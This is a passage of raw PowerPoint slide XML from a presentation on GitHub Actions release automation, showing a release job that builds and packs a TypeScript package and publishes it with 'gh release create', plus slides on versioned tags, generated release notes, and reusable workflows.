              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># version unchanged</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>else</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  should_deploy=true    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># new version</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>fi</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Deploy = an automatic GitHub Release</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The release job builds the package and publishes it, no artifact hand-off</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1508760"/>
            <a:ext cx="5989320" cy="329184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400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>release job (ts-deploy.yml)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>pnpm build</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>pnpm pack --pack-destination ../release</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># notes = PRs merged since the previous ts-app release</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>previous=$(gh release list --json tagName \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  --jq </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>'[.[].tagName | select(startswith("ts-app-v"))][0]'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>gh release create </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"$TAG"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> release/* \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  --target </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"$GITHUB_SHA"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> --title </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"ts-app $VERSION"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  --generate-notes --notes-start-tag </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"$previous"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="1554480"/>
            <a:ext cx="512064" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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6" name="Icon 6" descr="Tag"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6980895" y="1677375"/>
            <a:ext cx="266273" cy="266273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7543800" y="1517904"/>
            <a:ext cx="4096512" cy="7772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A tag per version</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ts-app-v1.0.1 / java-app-v1.0.1 marks the exact commit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="2377440"/>
            <a:ext cx="512064" cy="512064"/>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9" name="Icon 9" descr="FileCode"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6980895" y="2500335"/>
            <a:ext cx="266273" cy="266273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7543800" y="2340864"/>
            <a:ext cx="4096512" cy="7772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Release notes written for you</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Generated from the PRs merged since the last release</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="3200400"/>
            <a:ext cx="512064" cy="512064"/>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2" name="Icon 12" descr="Package"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6980895" y="3323295"/>
            <a:ext cx="266273" cy="266273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7543800" y="3163824"/>
            <a:ext cx="4096512" cy="7772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Files attached</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.tgz for TypeScript, .jar + SBOM for Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="4023360"/>
            <a:ext cx="512064" cy="512064"/>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5" name="Icon 15" descr="Lock"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6980895" y="4146255"/>
            <a:ext cx="266273" cy="266273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7543800" y="3986784"/>
            <a:ext cx="4096512" cy="77724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500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Clean build</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Built from scratch without the shared cache</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Why not artifacts"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4983480"/>
            <a:ext cx="11091672" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="282828"/>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8" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4983480"/>
            <a:ext cx="2377440" cy="77724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400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Why not an artifact?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="5157216"/>
            <a:ext cx="2560320" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3C3C3C"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Artifacts expire</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="5157216"/>
            <a:ext cx="2560320" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3C3C3C"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Need a GitHub login</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778240" y="5157216"/>
            <a:ext cx="2560320" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3C3C3C"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tied to a run, not a version</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="125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Reuse instead of copy-paste</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Composite actions share steps, reusable workflows share whole jobs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="566928" cy="566928"/>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5" name="Icon 5" descr="Box"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="684703" y="1690543"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="1517904"/>
            <a:ext cx="4663440" cy="6400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800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Composite action</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shares steps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: used by 9 jobs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
